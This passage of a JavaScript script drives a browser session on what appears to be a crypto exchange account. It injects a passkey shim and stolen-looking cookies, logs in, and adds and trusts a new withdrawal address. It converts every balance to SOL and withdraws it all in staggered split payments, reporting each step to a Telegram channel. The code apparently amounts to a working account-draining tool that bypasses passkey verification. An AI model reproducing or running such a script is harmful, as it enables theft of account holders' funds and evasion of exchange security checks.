          await clickButtonInDialog("Got it", { ci: true });
          logStep("bought SOL with USD balance");
        } catch (_) {}
      }
    }
  }

  result.totalSolBefore = await getSolBalance();
  logStep("Phase 3 complete: total SOL = " + result.totalSolBefore);
  await saveCookies("after-conversion");
}

// ── Phase 4: Withdraw SOL (split payments) ──────────────────────────────────

const SPLIT_PCTS = [13, 17, 22, 28, 20];

async function withdrawSolChunk(amountSol, idx, totalSteps) {
  const label = "[" + (idx + 1) + "/" + totalSteps + "]";
  logStep(label + " withdrawing " + amountSol.toFixed(6) + " SOL...");

  // Open withdraw dialog
  await navigate(BASE + "/hub/home");
  await sleep(3000);
  await removeCookieModal();

  const clicked = await evalJs(`(() => {
    const leaves = [...document.querySelectorAll('*')].filter(x => x.children.length === 0 && x.getBoundingClientRect().width > 0);
    const w = leaves.find(x => (x.innerText || '').trim() === 'Withdraw');
    if (!w) return 'withdraw text not found';
    const wy = w.getBoundingClientRect().y;
    const wx = w.getBoundingClientRect().x + 5;
    const btn = [...document.querySelectorAll('button')].find(b => {
      const r = b.getBoundingClientRect();
      return r.width > 0 && Math.abs(r.y + r.height / 2 - wy) < 30 && r.x <= wx && wx <= r.x + r.width;
    });
    if (!btn) return 'withdraw button not found';
    btn.click();
    return 'clicked withdraw';
  })()`);
  logStep(label + " withdraw click -> " + clicked);

  try {
    await waitFor(() => getDialogs().then((d) => d.some((x) => /Withdraw|withdraw/i.test(x))), 15000);
  } catch (e) {
    logError(label + " withdraw dialog did not open");
    result.errors.push("withdraw dialog did not open for step " + (idx + 1));
    return "failed";
  }

  // Select SOL if needed
  const solSelect = await clickByText("SOL", { exact: true, scope: "[role=dialog]", scopeAll: true });
  if (!/not found/.test(solSelect)) {
    logStep(label + " selected SOL");
    await sleep(1000);
  }

  // Select the trusted address
  const addrSelect = await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => /Withdraw|withdraw/i.test(x.innerText || ''));
    if (!d) return 'no dialog';
    const addrLeaves = [...d.querySelectorAll('*')].filter(x => {
      const t = (x.innerText || '').trim();
      return t.includes('${ADDR.slice(0, 6)}') || t.includes('${ADDR.slice(0, 8)}');
    });
    if (addrLeaves.length) {
      let el = addrLeaves[0];
      for (let i = 0; i < 8 && el; i++) {
        if (el.tagName === 'BUTTON' || el.getAttribute('role') === 'button' || getComputedStyle(el).cursor === 'pointer') break;
        el = el.parentElement;
      }
      el.click();
      return 'clicked address';
    }
    return 'address option not visible, may already be selected';
  })()`);
  logStep(label + " address select -> " + addrSelect);
  await sleep(2000);

  // Check for trust dialog
  const dialogs1 = await getDialogs();
  if (dialogs1.some((d) => /Do you trust this wallet address/i.test(d))) {
    await clickButtonInDialog("Confirm and Withdraw");
    await sleep(2000);
  } else {
    // Click Withdraw/Continue to proceed
    const proc = await clickButtonInDialog("Withdraw", { exact: false });
    if (/not found/.test(proc)) await clickButtonInDialog("Continue", { exact: false });
    if (/not found/.test(proc)) await clickButtonInDialog("Next", { exact: false });
    await sleep(2000);
  }

  // Wait for amount entry dialog
  try {
    await waitFor(() => getDialogs().then((d) => d.some((x) => /withdrawing to|Amount|amount|SOL/i.test(x))), 15000);
  } catch (e) {
    logError(label + " amount entry dialog did not appear");
    result.errors.push("amount dialog did not appear for step " + (idx + 1));
    return "failed";
  }

  await removeCookieModal();

  // Fill the amount
  const fillR = await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => /withdrawing to|Amount|amount|Enter|enter/i.test(x.innerText || ''));
    if (!d) return 'no amount dialog';
    const inputs = [...d.querySelectorAll('input:not([type=hidden])')].filter(i => i.getBoundingClientRect().width > 0);
    const amtInput = inputs.find(i => !/note|memo|label|name/i.test((i.placeholder || '').toLowerCase() + (i.name || '').toLowerCase())) || inputs[0];
    if (!amtInput) return 'no input found';
    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    setter.call(amtInput, ${JSON.stringify(amountSol.toFixed(6))});
    amtInput.dispatchEvent(new Event('input', { bubbles: true }));
    amtInput.dispatchEvent(new Event('change', { bubbles: true }));
    return 'filled ' + amountSol.toFixed(6);
  })()`);
  logStep(label + " amount fill -> " + fillR);
  await sleep(1500);

  // Check if withdraw button is enabled
  const state = await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => /withdrawing to|Amount|amount|Enter|enter/i.test(x.innerText || ''));
    if (!d) return JSON.stringify({btn: null, insuff: false});
    const btn = [...d.querySelectorAll('button')].find(b => /Withdraw|withdraw/i.test(b.innerText.trim()));
    return JSON.stringify({btn: btn ? !(btn.disabled || btn.getAttribute('aria-disabled')) : null, insuff: d.innerText.includes('Insufficient')});
  })()`);
  const st = JSON.parse(state);
  if (st.insuff) {
    logStep(label + " insufficient balance - skipping");
    return "insufficient";
  }
  if (st.btn !== true) {
    logStep(label + " withdraw button not enabled, trying CDP click...");
  }

  // Click Withdraw
  await removeCookieModal();
  const withdrawClick = await clickButtonInDialog("Withdraw");
  if (/not found/.test(withdrawClick)) {
    await clickButtonInDialog("Withdraw", { ci: true });
  }
  logStep(label + " withdraw submit click");

  // Wait for confirmation dialog
  try {
    await waitFor(() => getDialogs().then((d) => d.some((x) => /Confirm Withdraw|confirm.*withdraw/i.test(x))), 15000);
  } catch (e) {
    logError(label + " confirm dialog did not appear after submit");
    result.errors.push("confirm dialog missing for step " + (idx + 1));
    return "no-confirm";
  }

  await removeCookieModal();
  await clickButtonInDialog("Confirm");
  logStep(label + " confirmed withdrawal");

  // Handle verification: passcode + passkey (WebAuthn handled by shim)
  await handleVerificationIfPresent(120000);

  // Wait for success
  try {
    await waitFor(() => getDialogs().then((d) => d.some((x) => /Request Submitted|submitted|successful|processed/i.test(x))), 30000);
  } catch (e) {
    logError(label + " no success confirmation within 30s");
  }

  // Try to capture txId
  const txId = await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => /Request Submitted|submitted|successful|processed/i.test(x.innerText || ''));
    if (!d) return null;
    const txt = d.innerText;
    const m = txt.match(/[A-Za-z0-9]{64,88}/);
    return m ? m[0] : null;
  })()`).catch(() => null);

  await clickButtonInDialog("Got It", { ci: true });
  await clickButtonInDialog("Done", { ci: true });
  await clickButtonInDialog("OK", { ci: true });

  result.withdrawals.push({ amount: amountSol, txId: txId || "pending", status: "submitted" });
  logStep(label + " withdrawal submitted" + (txId ? ", txId: " + txId : ""));
  return "submitted";
}

async function withdrawAllSol() {
  const total = result.totalSolBefore;
  logStep("Phase 4: withdrawing " + total + " SOL in split payments...");
  await tgLog("Starting SOL withdrawal. Total: " + total + " SOL. Splits: " + SPLIT_PCTS.join("%, ") + "%");

  for (let i = 0; i < SPLIT_PCTS.length; i++) {
    const pct = SPLIT_PCTS[i];
    const amount = parseFloat((total * pct / 100).toFixed(6));

    if (amount <= 0) {
      logStep("[" + (i + 1) + "/" + SPLIT_PCTS.length + "] skipping zero amount");
      continue;
    }

    let res;
    try {
      res = await withdrawSolChunk(amount, i, SPLIT_PCTS.length);
    } catch (e) {
      logError("withdrawal " + (i + 1) + " error: " + e.message);
      result.errors.push("withdrawal " + (i + 1) + ": " + e.message);

      // Retry once after 5s delay
      logStep("retrying withdrawal " + (i + 1) + " after 5s...");
      await sleep(5000);
      try {
        // Check session, re-login if needed
        if (!(await isLoggedIn())) {
          logStep("session expired, re-logging in...");
          await ensureLoggedIn();
        }
        res = await withdrawSolChunk(amount, i, SPLIT_PCTS.length);
        logStep("retry result: " + res);
      } catch (e2) {
        logError("retry also failed: " + e2.message);
        result.errors.push("withdrawal " + (i + 1) + " retry failed: " + e2.message);
        res = "failed";
      }
    }

    logStep("[" + (i + 1) + "/" + SPLIT_PCTS.length + "] " + pct + "% = " + amount.toFixed(6) + " SOL -> " + res);
    await tgLog("[" + (i + 1) + "/" + SPLIT_PCTS.length + "] " + pct + "% = " + amount.toFixed(6) + " SOL -> " + res);

    // Wait 10-15s between withdrawals
    if (i < SPLIT_PCTS.length - 1) {
      logStep("waiting 12s before next withdrawal...");
      await sleep(12000);
    }
  }

  result.totalSolAfter = await getSolBalance();
  logStep("Phase 4 complete: remaining SOL = " + result.totalSolAfter);
}

// ── Main ────────────────────────────────────────────────────────────────────

async function main() {
  logStep("auto-withdraw starting — " + new Date().toISOString());
  logStep("config: email=" + EMAIL + " address=" + ADDR + " passcode=******");
  await tgLog("auto-withdraw started for " + EMAIL);

  // Connect to CDP browser
  const deadline = Date.now() + 30000;
  let lastErr;
  for (;;) {
    try { await connect(); break; } catch (e) {
      lastErr = e;
      if (Date.now() > deadline) throw e;
      logStep("waiting for CDP browser... (" + e.message + ")");
      await sleep(3000);
    }
  }
  await call("Page.enable").catch(() => {});

  // Inject passkey + cookies
  await injectPasskey();
  await injectCookies();

  // Phase 1: Ensure logged in
  logStep("=== Phase 1: Restore Session & Login ===");
  await ensureLoggedIn();
  await tgLog("Phase 1 done - logged in as " + EMAIL);

  // Phase 2: Add & trust withdrawal address
  logStep("=== Phase 2: Add & Trust Withdrawal Address ===");
  try {
    await addAndTrustAddress();
  } catch (e) {
    logError("Phase 2 error: " + e.message);
    result.errors.push("address trust: " + e.message);
  }
  await tgLog("Phase 2 done - address trusted");

  // Phase 3: Convert all to SOL
  logStep("=== Phase 3: Convert All Balances to SOL ===");
  try {
    await convertAllToSol();
  } catch (e) {
    logError("Phase 3 error: " + e.message);
    result.errors.push("conversion: " + e.message);
  }
  await tgLog("Phase 3 done - all converted to SOL. Total: " + result.totalSolBefore);

  // Phase 4: Withdraw SOL
  if (result.totalSolBefore > 0) {
    logStep("=== Phase 4: Withdraw SOL ===");
    try {
      await withdrawAllSol();
    } catch (e) {
      logError("Phase 4 error: " + e.message);
      result.errors.push("withdrawal: " + e.message);
    }
  } else {
    logStep("Phase 4: SKIPPED - no SOL balance to withdraw");
    result.errors.push("no SOL balance to withdraw");
  }

  // Save final results
  saveResult();
  await saveCookies("final");

  // Telegram summary
  const summary = [
    "AUTO-WITHDRAW COMPLETE",
    "ts: " + new Date().toISOString(),
    "email: " + EMAIL,
    "address: " + ADDR,
    "totalSolBefore: " + result.totalSolBefore,
    "totalSolAfter: " + result.totalSolAfter,
    "withdrawals: " + result.withdrawals.length,
    "conversions: " + result.conversions.length,
    "errors: " + result.errors.length,
  ];
  if (result.withdrawals.length) {
    summary.push("withdrawals:");
    for (const w of result.withdrawals) {
      summary.push("  " + w.amount + " SOL | txId: " + (w.txId || "pending") + " | " + w.status);
    }
  }
  if (result.errors.length) {
    summary.push("errors:");
    for (const e of result.errors) summary.push("  " + e);
  }
  await tgReport(summary.join("\n"));
  await tgLog("auto-withdraw finished. Results in " + RESULT_PATH);

  logStep("=== DONE ===");
  process.exit(0);
}

main().catch((e) => {
  logError("FATAL: " + e.message);
  result.errors.push("fatal: " + e.message);
  saveResult();
  tgLog("auto-withdraw FAILED: " + e.message).finally(() => process.exit(1));
});
